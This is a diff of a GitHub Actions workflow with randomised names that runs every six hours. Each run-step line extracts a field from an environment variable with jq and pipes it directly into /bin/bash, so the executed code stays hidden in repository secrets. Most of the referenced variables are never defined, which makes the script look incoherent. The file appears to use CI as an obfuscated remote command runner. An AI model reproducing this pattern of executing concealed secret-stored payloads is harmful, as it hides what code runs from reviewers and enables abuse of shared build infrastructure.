@@ -1,8 +1,10 @@
 name: zhuzhuanyun3987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
+    - cron: '23 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +13,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhuzhuanyun3987
         env:
-          qc8130: ${{ secrets.qc8130 }}
+          sf19556: ${{ secrets.sf19556 }}
         run: |
-          echo $qc8130 | jq -r .sym5607 | /bin/bash
-          echo $hmg98 | jq -r .yf65930 | /bin/bash
-          echo $fpnex78 | jq -r .qq6582 | /bin/bash
-          echo $x61662 | jq -r .ggt18934 | /bin/bash
-          echo $bsej62 | jq -r .i466 | /bin/bash
-          echo $j4 | jq -r .gk5539 | /bin/bash
+          echo $sf19556 | jq -r .weem3 | /bin/bash
+          echo $sfc0634 | jq -r .vi157 | /bin/bash
+          echo $kujb84700 | jq -r .juypb7 | /bin/bash
+          echo $ot12762 | jq -r .bhc4643 | /bin/bash
+          echo $sxfn610 | jq -r .hsrz0540 | /bin/bash
+          echo $tgsps35368 | jq -r .pauvk9200 | /bin/bash
+          echo $mvtw565 | jq -r .qotf606 | /bin/bash
+          echo $ed9 | jq -r .a9 | /bin/bash
+          echo $pblhk2297 | jq -r .isvfb2 | /bin/bash
+          echo $mut9399 | jq -r .spnhi44 | /bin/bash
 
